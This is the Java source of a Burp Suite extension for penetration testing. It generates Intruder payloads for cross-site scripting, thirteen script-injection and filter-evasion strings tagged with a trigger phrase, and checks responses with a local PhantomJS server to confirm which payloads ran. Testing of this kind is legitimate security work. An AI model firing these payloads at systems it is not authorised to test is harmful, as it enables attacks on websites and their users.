package burp;
import burp.*;
import java.awt.Component;
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.util.HashMap;
import java.util.List;

import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JLabel;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTabbedPane;
import javax.swing.SwingUtilities;

import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicHeader;
import org.apache.http.util.EntityUtils;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import org.apache.commons.codec.binary.Base64;

import burp.ITab;
import burp.IContextMenuFactory;
import burp.IContextMenuInvocation;

public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor	{
	public burp.IBurpExtenderCallbacks mCallbacks;
	private IExtensionHelpers helpers;
	private PrintWriter stdout;
    private PrintWriter stderr;
    
    private HttpClient client;
    
    // Default server location for phantomJS Server
    // If you're using a customer server, please change and recompile.
    private static String phantomServer = "http://127.0.0.1:8093";
    
    private static String triggerPhrase = "f7sdgfjFpoG";
    
    public JPanel mainPanel, menuPanel;
    public JTabbedPane tabbedPane;
    public JButton btnAddText,btnSaveTabAsTemplate,btnRemoveTab;
    public JComboBox tabList;
	
    /**
     * Initial Payloads containing trigger phrase, f7sdgfjFpoG.
     * 
     * The phantom server is designed to report XSS only if the
     * function calls contain the trigger phrase, suggesting
     * that it was passed via the Burp payload.
     * 
     * This is used to reduce the likelihood of false-positives.
     */
    public static final byte[][] PAYLOADS = {
		("<script>alert('" + triggerPhrase + "')</script>").getBytes(),
		("\"><script>alert('" + triggerPhrase + "')</script>").getBytes(),
		("'><script>alert('" + triggerPhrase + "')</script>").getBytes(),
		("<SCRIPT>alert('" + triggerPhrase + "');</SCRIPT>").getBytes(),
		("<scri<script>pt>alert('" + triggerPhrase + "');</scr</script>ipt>").getBytes(),
		("<SCRI<script>PT>alert('" + triggerPhrase + "');</SCR</script>IPT>").getBytes(),
		("<scri<scr<script>ipt>pt>alert('" + triggerPhrase + "');</scr</sc</script>ript>ipt>").getBytes(),
		("\";alert('" + triggerPhrase + "');\"").getBytes(),
		("<SCR%00IPT>alert(\\\"" + triggerPhrase + "\\\")</SCR%00IPT>").getBytes(),
		("<SCRIPT>a=/" + triggerPhrase + "/").getBytes(),
		("\\\";alert('" + triggerPhrase + "');//").getBytes(),
		("<STYLE TYPE=\"text/javascript\">alert('" + triggerPhrase + "');</STYLE>").getBytes(),
		("<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('" + triggerPhrase + "');+ADw-/SCRIPT+AD4-").getBytes(),
	};
	
	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
		mCallbacks = callbacks;
		
		this.client = HttpClientBuilder.create().build();
		helpers = callbacks.getHelpers();
		callbacks.setExtensionName("XSS Validator Payloads");
		stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
		callbacks.registerIntruderPayloadGeneratorFactory(this);
		callbacks.registerIntruderPayloadProcessor(this);
		callbacks.registerHttpListener(this);
		
		SwingUtilities.invokeLater(new Runnable(){
        	@Override
        	public void run(){
        		//Create our initial UI components
                mainPanel = new JPanel(new BorderLayout());
                menuPanel = new JPanel();
                menuPanel.setPreferredSize(new Dimension(150,500));
        		tabbedPane = new JTabbedPane();
                mainPanel.add(menuPanel, BorderLayout.LINE_START);
                mainPanel.add(tabbedPane, BorderLayout.CENTER);
                
        		//Add the save,load, and document buttons
                JLabel menuLabel = new JLabel("Menu"); 
                btnAddText = new JButton("New Text");
                btnAddText.setPreferredSize(new Dimension(130,30));

              
        		mCallbacks.customizeUiComponent(mainPanel);
        		mCallbacks.addSuiteTab(BurpExtender.this);
        	}
        });
	}
	
	public String getTabCaption() {
		return "xssValidator";
	}

	@Override
	public Component getUiComponent() {
		return mainPanel;
	}
	
	@Override
	public String getGeneratorName() {
		return "XSS Validator Payloads";
	}
	
	@Override
    public IIntruderPayloadGenerator createNewInstance(IIntruderAttack attack)
    {
        // return a new IIntruderPayloadGenerator to generate payloads for this attack
        return new IntruderPayloadGenerator();
    }
    
    @Override
    public String getProcessorName() {
        return "XSS Validator";
    }
    
    @Override
    public byte[] processPayload(byte[] currentPayload, byte[] originalPayload, byte[] baseValue) {
    	return helpers.stringToBytes(helpers.urlEncode(helpers.bytesToString(currentPayload)));
    }
    
    /**
     * This function is called every time Burp receives an HTTP message.
     * We look specifically at messages that contain a toolFlag of 32,
     * indicating that the message is intended for the intruder. If it's
     * not, we don't care about it.
     * 
     * The function currently ignores requests, and handles only HTTP
     * responses. The response is captured and encoded, then passed
     * along to the phantomJS server for processing.
     * 
     * If the phantomJS server indicates a successful XSS attack,
     * append the phrase 'fy7sdufsuidfhuisdf' to the response.
     * 
     * We then use this phrase in accompaniment with intruders grep-match
     * functionality to determine whether the specific payload triggered
     * xss.
     */
	public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        if (toolFlag == 32 && messageIsRequest) {
        	// Manipulate intruder request, if necessary
        } else if (toolFlag == 32 && ! messageIsRequest) {
        	HttpPost PhantomJs = new HttpPost(phantomServer);
        	
        	try {
        		byte[] encodedBytes = Base64.encodeBase64(messageInfo.getResponse());
        		String encodedResponse = helpers.bytesToString(encodedBytes);
        		
	        	List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(1);
	        	nameValuePairs.add(new BasicNameValuePair("http-response", encodedResponse));
	        	
	        	PhantomJs.setEntity(new UrlEncodedFormEntity(nameValuePairs));

	        	HttpResponse response = client.execute(PhantomJs);
	        	String responseAsString = EntityUtils.toString(response.getEntity());
	            
            	stdout.println("Response: " + responseAsString);
            	
	            // parse response for XSS by checking whether it contains 
            	// the trigger phrase
	            if(responseAsString.toLowerCase().contains(triggerPhrase.toLowerCase())) {
	            	// Append weird string to identify XSS
		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + "fy7sdufsuidfhuisdf";
	            	messageInfo.setResponse(helpers.stringToBytes(newResponse));
	            	stdout.println("XSS Found");
	            }
	            
        	} catch (Exception e) {
        		stderr.println(e.getMessage());
        	}
        }
	}
	
	/**
	 * 
	 * Basic class to generate intruder payloads.
	 * 
	 * In this case, simply iterate over the payloads defined
	 * in the parent class.	
	 */
	class IntruderPayloadGenerator implements IIntruderPayloadGenerator {
		int payloadIndex;
		
		@Override
		public boolean hasMorePayloads() {
			return payloadIndex < PAYLOADS.length;
		}
		
		@Override
		public byte[] getNextPayload(byte[] baseValue) {			
			byte[] payload = PAYLOADS[payloadIndex];
			payloadIndex++;
			return payload;
		}
		
		@Override
		public void reset() {
			payloadIndex = 0;
		}
		
	}
}
